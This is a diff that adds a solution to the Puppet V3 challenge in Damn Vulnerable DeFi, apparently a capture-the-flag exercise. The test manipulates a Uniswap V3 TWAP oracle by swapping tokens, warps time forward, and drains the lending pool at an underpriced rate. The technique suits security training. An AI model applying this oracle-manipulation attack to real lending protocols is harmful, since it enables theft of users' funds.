@@ -11,6 +11,8 @@ import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {INonfungiblePositionManager} from "../../src/puppet-v3/INonfungiblePositionManager.sol";
 import {PuppetV3Pool} from "../../src/puppet-v3/PuppetV3Pool.sol";
 
+import {Attack} from "./Attack.t.sol";
+
 contract PuppetV3Challenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
@@ -119,7 +121,18 @@ contract PuppetV3Challenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppetV3() public checkSolvedByPlayer {
-        
+        IUniswapV3Pool uniswapPool = IUniswapV3Pool(uniswapFactory.getPool(address(weth), address(token), FEE));
+        Attack attack = new Attack(uniswapPool, weth, token);
+
+        token.transfer(address(attack), PLAYER_INITIAL_TOKEN_BALANCE);
+        attack.swap(PLAYER_INITIAL_TOKEN_BALANCE);
+
+        vm.warp(block.timestamp + 114);
+
+        weth.deposit{value: PLAYER_INITIAL_ETH_BALANCE}();
+        weth.approve(address(lendingPool), type(uint256).max);
+        lendingPool.borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
+        token.transfer(recovery, LENDING_POOL_INITIAL_TOKEN_BALANCE);
     }
 
     /**
